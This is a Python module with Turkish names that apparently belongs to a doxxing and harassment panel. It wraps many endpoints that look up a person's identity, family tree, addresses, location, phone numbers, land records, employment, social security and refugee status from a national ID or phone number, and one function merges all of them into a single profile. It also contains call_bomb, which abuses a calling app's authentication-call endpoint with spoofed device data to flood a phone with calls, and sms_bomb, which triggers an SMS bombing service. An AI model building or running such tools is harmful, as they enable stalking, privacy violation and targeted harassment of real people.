# sorgu_api.py
import time
import uuid
import json
import requests
from threading import Lock
from config import TELZ_BASE, TELZ_HEADERS, TELZ_MODE, TELZ_RATE_LIMIT, SMS_BOMBER_URL
from api import call_php


def tc(v): return call_php("/101m/101m-tc-sorgulama.php", {"tc": v})
def tcpro(v): return call_php("/109m/tcpro.php", {"tc": v})
def adsoyad(ad, soyad, il=""):
    p = {"adi": ad, "soyadi": soyad}
    if il: p["nufusil"] = il
    return call_php("/101m/101m-ad-soyad.php", p)
def iki_isim(ad, soyad, il=""):
    p = {"adi": ad, "soyadi": soyad}
    if il: p["nufusil"] = il
    return call_php("/101m/101m-ad-ad2-soyad.php", p)
def aile(v): return call_php("/101m/aile.php", {"tc": v})
def ailepro(v): return call_php("/101m/ailepro.php", {"tc": v})
def ailedetay(v): return call_php("/101m/ailedetay.php", {"tc": v})
def soyagaci(v): return call_php("/101m/soyagaci-v2.php", {"key": "lunaxcarma", "tc": v})
def sulale(v): return call_php("/101m/101m-tc-sorgulama-sulale.php", {"tc": v})
def cocuk(v): return call_php("/109m/cocuk-sorgu.php", {"tc": v})
def adres(v): return call_php("/82m/82m-api-adres.php", {"kimlikNo": v})
def konum(v): return call_php("/82m/adres-konum.php", {"kimlikNo": v})
def adres2024(v): return call_php("/81m/adres2024.php", {"tc": v})
def tcgsm(v): return call_php("/116m/tcgsm.php", {"tc": v})
def gsmtc(v): return call_php("/116m/gsmdetay.php", {"gsm": v})
def gsmpro(v): return call_php("/109m/gsmpro.php", {"gsm": v})
def operator(v): return call_php("/116m/operator.php", {"gsm": v})
def gsmcoklu(v): return call_php("/116m/gsmdetay_coklu.php", {"gsm": v})
def tcgsmdetay(v): return call_php("/116m/tcgsmdetay.php", {"value": v})
def iban(v): return call_php("/iban/iban.php", {"iban": v})
def plaka(v): return call_php("/plaka/plaka.php", {"Plaka_No": v})
def plakaceza(v): return call_php("/plaka/plakaceza.php", {"plaka": v})
def tapu_tc(v): return call_php("/tapu/taputc.php", {"tc": v})
def tapu_adsoyad(ad, soyad): return call_php("/tapu/tapuadsoyad.php", {"adi": ad, "soyadi": soyad})
def parsel(v): return call_php("/tapu/adaparsel.php", {"ada": v})
def parsel_il_ilce(ada, prs, il="", ilce=""):
    p = {"ada": ada, "parsel": prs}
    if il: p["il"] = il
    if ilce: p["ilce"] = ilce
    return call_php("/tapu/adaparsel-il-ilce.php", p)
def isyeri(v): return call_php("/isyeri/işyeriyt.php", {"tc": v})
def sgk(v): return call_php("/sgk/sgk.php", {"tc": v})
def calisan(v): return call_php("/sgk/calisan.php", {"tc": v})
def okul(v): return call_php("/25m/okulno.php", {"tc": v})
def multeci(v): return call_php("/6m/multeci.php", {"tc": v})
def vesika(v): return call_php("/deneme.php", {"tc": v})
def papara(v): return call_php("/papara/papara.php", {"paparano": v})
def ttnet(v): return call_php("/ttnet/ttnet.php", {"gsm": v})


def uzay_modu(tc_deger):
    sonuclar = {}
    adimlar = [
        ("tc", "TC Sorgu", lambda: tc(tc_deger)),
        ("tcpro", "TC Pro", lambda: tcpro(tc_deger)),
        ("aile", "Aile", lambda: aile(tc_deger)),
        ("ailepro", "Aile Pro", lambda: ailepro(tc_deger)),
        ("ailedetay", "Aile Detay", lambda: ailedetay(tc_deger)),
        ("soyagaci", "Soy Ağacı", lambda: soyagaci(tc_deger)),
        ("cocuk", "Çocuk", lambda: cocuk(tc_deger)),
        ("sulale", "Sülale", lambda: sulale(tc_deger)),
        ("adres", "Adres", lambda: adres(tc_deger)),
        ("konum", "Konum", lambda: konum(tc_deger)),
        ("adres2024", "Adres 2024", lambda: adres2024(tc_deger)),
        ("tapu", "Tapu", lambda: tapu_tc(tc_deger)),
        ("isyeri", "İşyeri", lambda: isyeri(tc_deger)),
        ("calisan", "Çalışan", lambda: calisan(tc_deger)),
        ("sgk", "SGK", lambda: sgk(tc_deger)),
        ("okul", "Okul", lambda: okul(tc_deger)),
        ("multeci", "Mülteci", lambda: multeci(tc_deger)),
        ("vesika", "Vesika", lambda: vesika(tc_deger)),
        ("tcgsm", "TC→GSM", lambda: tcgsm(tc_deger)),
        ("tcgsmdetay", "TC-GSM-TC", lambda: tcgsmdetay(tc_deger)),
    ]
    for key, name, fn in adimlar:
        try:
            sonuclar[key] = {"name": name, "res": fn()}
        except Exception as e:
            sonuclar[key] = {"name": name, "res": {"success": False, "error": str(e)[:200]}}
    return sonuclar


class CallLimiter:
    def __init__(self, seconds=TELZ_RATE_LIMIT):
        self.seconds = float(seconds)
        self._last = {}
        self._lock = Lock()

    def can_call(self, phone):
        now = time.time()
        with self._lock:
            last = self._last.get(phone)
            if last is None or (now - last) >= self.seconds:
                self._last[phone] = now
                return True
            return False


_limiter = CallLimiter(TELZ_RATE_LIMIT)


class TelzClient:
    def __init__(self):
        self.android_id = uuid.uuid4().hex[:16] if TELZ_MODE == "TEST_RANDOM_IDS" else "13e50e93a6399e67"
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())

    def _post(self, endpoint, payload, timeout=15.0):
        body = dict(payload)
        body.update({
            "android_id": self.android_id,
            "app_version": "17.5.33",
            "os": "android",
            "os_version": "15",
            "ts": int(time.time() * 1000),
            "uuid": self.uuid,
        })
        r = self.session.post(TELZ_BASE + endpoint, data=json.dumps(body),
                              headers=TELZ_HEADERS, timeout=timeout)
        if r.status_code == 429:
            raise RuntimeError("Fazla deneme, bekle")
        r.raise_for_status()
        try:
            return r.json()
        except ValueError:
            return r.text

    def call(self, phone):
        if not _limiter.can_call(phone):
            raise RuntimeError(f"Bu numaraya kısa süre önce arama atıldı, {TELZ_RATE_LIMIT}sn bekle")
        return self._post("app/auth_call", {
            "event": "auth_call", "phone": phone, "attempt": "0", "lang": "tr",
        })


def call_bomb(phone, amount=1):
    digits = "".join(c for c in phone if c.isdigit())
    if digits.startswith("90"): digits = digits[2:]
    if digits.startswith("0"): digits = digits[1:]
    if len(digits) != 10 or not digits.startswith("5"):
        return {"success": False, "error": "Geçersiz numara, 5xxxxxxxxx formatında gir"}
    client = TelzClient()
    ok = 0
    fail = 0
    log = []
    for i in range(amount):
        try:
            client.call(digits)
            ok += 1
            log.append(f"{i+1}. OK")
        except Exception as e:
            fail += 1
            log.append(f"{i+1}. FAIL {str(e)[:80]}")
        time.sleep(1.0)
    return {"success": ok > 0, "ok": ok, "fail": fail, "phone": digits, "amount": amount, "log": log}


def sms_bomb(phone, amount=1):
    digits = "".join(c for c in phone if c.isdigit())
    if digits.startswith("90"): digits = digits[2:]
    if digits.startswith("0"): digits = digits[1:]
    if len(digits) != 10 or not digits.startswith("5"):
        return {"success": False, "error": "Geçersiz numara"}
    try:
        r = requests.get(SMS_BOMBER_URL, params={"phone": digits, "how": amount}, timeout=120)
        if r.status_code == 200:
            try:
                data = r.json()
                return {"success": data.get("basarili", 0) > 0,
                        "ok": data.get("basarili", 0),
                        "fail": data.get("basarisiz", 0),
                        "phone": digits, "amount": amount,
                        "log": (data.get("sonuclar") or [])[:10]}
            except Exception:
                return {"success": True, "ok": amount, "fail": 0,
                        "phone": digits, "amount": amount, "log": [r.text[:200]]}
        return {"success": False, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)[:200]}